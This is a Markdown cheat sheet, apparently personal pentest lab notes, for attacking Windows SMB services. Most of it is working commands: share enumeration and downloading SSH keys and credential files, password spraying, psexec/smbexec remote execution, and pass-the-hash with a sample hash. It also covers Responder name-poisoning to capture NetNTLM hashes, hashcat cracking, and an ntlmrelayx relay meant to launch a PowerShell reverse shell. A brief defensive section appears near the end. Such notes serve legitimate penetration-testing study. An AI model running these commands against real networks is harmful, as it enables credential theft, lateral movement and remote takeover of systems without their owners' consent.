---
title: "Attacking Common Services — SMB"
tags: [attacking-common-services, smb, lateral-movement, forced-auth, relay]
tools: [nmap, smbclient, smbmap, crackmapexec, rpcclient, enum4linux, responder, impacket, bloodhound, hashcat]
---

# SMB

## Summary
SMB is a primary lateral-movement and credential-harvesting vector on Windows networks. Exposed shares often contain plaintext secrets, SSH keys, backups, or configuration files. SMB supports many offensive techniques: share enumeration, credential reuse, remote command execution (psexec/smbexec), NetNTLM capture (forced auth), NTLM relay, and exploitation of protocol vulnerabilities (e.g., SMBGhost). Prioritize read-only shares first — they’re low risk and high reward.

---

## Discovery & Enumeration
- Scan hosts for SMB (445/tcp) and NetBIOS (137/138/139):
```bash
nmap -p445,139,137 --script smb-enum-shares,smb-os-discovery <target>
```
- Quick share listing with `smbclient`:
```bash
smbclient -N -L //<target>
```
- Authenticated enumeration with `smbmap` to check permissions and quickly pull files:
```bash
smbmap -H <target>
smbmap -u simon -p liverpool -H <target> -r Home --no-banner

# rpcclient
rpcclient -U'%' 10.129.203.6
rpcclient $> enumdomusers
user:[jason] rid:[0x3e8]
user:[robin] rid:[0x3e9]

# enum4linux
./enum4linux-ng.py 10.10.11.45 -A -C
```
- `enum4linux` / `enum4linux-ng` for a broad set of SMB/NetBIOS checks.

---

## File Operations
- Download files for local analysis:
```bash
smbmap -H <target> --download "Share\path\file"
# or
smbclient \\\\target\\Share -U user%pass -c 'lcd /tmp; get file'

# Download | upload a file
smbmap -H $htb --download "GGJ\id_rsa"
smbmap -u jason -p '34c8zuNBo91!@28Bszh' -H 10.129.203.6 --download "GGJ\id_rsa"
smbmap -H $htb --upload test.txt "GGJ\test.txt"
```
- Look for filenames: `creds.txt`, `passwords.txt`, `id_rsa`, `backup*.zip`, `*.sql`, `*.mdb`, `*.pst`.

---

## Password Attacks & Spraying
- Password spraying with CrackMapExec avoids immediate lockouts:
```bash
crackmapexec smb <target> -u users.txt -p 'Summer2024!' --local-auth
```
- Brute forcing (use sparingly and slowly): Hydra / Medusa can target SMB (or netbios auth surface).

---

## Remote Code Exec / Lateral Tools
- Impacket `psexec.py` / `smbexec.py` / `atexec.py` for command execution if valid creds exist:
```bash
# psexec
python3 /usr/share/impacket/examples/psexec.py DOMAIN/Administrator@<target> -hashes :NTLM_HASH

# smbexec
crackmapexec smb <target> -u Admin -p 'Passw0rd' --exec-method smbexec -x 'whoami'

# Impacket - smbexec or atexec
impacket-psexec administrator:'liverpool'@10.129.203.6

# Crackmap
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

# Enumerate users
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

# Extract hashes & PtH
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```
- `wmiexec.py` and `smbexec.py` are useful alternatives when SMB exec methods fail.

---

## Forced Authentication (NetNTLM Capture)
- Use `Responder` to capture NetNTLM v1/v2 hashes in LLMNR/NBNS/MDNS/SMB name resolution poisoning scenarios:
```bash
sudo responder -I eth0
# logs saved to /usr/share/responder/logs/
```
- Use `ntlmrelayx.py` (Impacket) to relay captured NetNTLM auth to target services (SMB, HTTP, LDAP) or to spawn a shell:
```bash
impacket-ntlmrelayx -t smb://<target> --no-daemon
```
- Crack captured hashes with `hashcat` (mode 5600 for NTLMv2):
```bash
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## NTLM Relay & RCE
- Relay captured NTLM auth to a target that accepts NTLM (often SMB, but also HTTP/LDAP) to escalate access.
- Example: disable SMB signing (if allowed) to improve relay success; check for SMB signing requirement via `smbclient` or `nmap` scripts.
- `impacket-ntlmrelayx` supports running a command or dropping a payload via SMB after successful relay.

PowerShell reverse shell using https://www.revshells.com/, Powershell #3 (Base64).

```bash
# Turn off smb in responder
cat /etc/responder/Responder.conf | grep 'SMB ='
SMB = Off

# Execute reverse shell
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e'
```

---

## Detection & Defensive Notes (for reporting)

- Enforce SMB signing and SMBv3 where possible to mitigate relay and downgrade attacks.
- Restrict SMB to internal networks and jump hosts; don't expose SMB to the Internet.
- Monitor for unusual file downloads from shares and for suspicious SMB authentication failures.
- Log creation/modification times and alert on new scheduled tasks / services created after SMB auth escalations.

---

## Known Vulnerabilities
- CVE-2020-0796 — SMBGhost (SMBv3 compression vulnerability) — wormable RCE on certain unpatched Windows versions.
- Keep Windows patched; legacy SMBv1 should be disabled.

---

## Quick Cheatsheet
```bash
# Scan and enumerate
nmap -p445 --script smb-enum-shares,smb-enum-users <target>

# List shares
smbclient -L //<target> -N

# Authenticated enum and download
smbmap -u simon -p liverpool -H <target> --download "Home\\IT\\creds.txt"

# Spray
crackmapexec smb <target> -u users.txt -p 'Password123!' --local-auth

# Start responder
sudo responder -I eth0

# Relay example
impacket-ntlmrelayx -t smb://<target> -smb2support --no-http
```
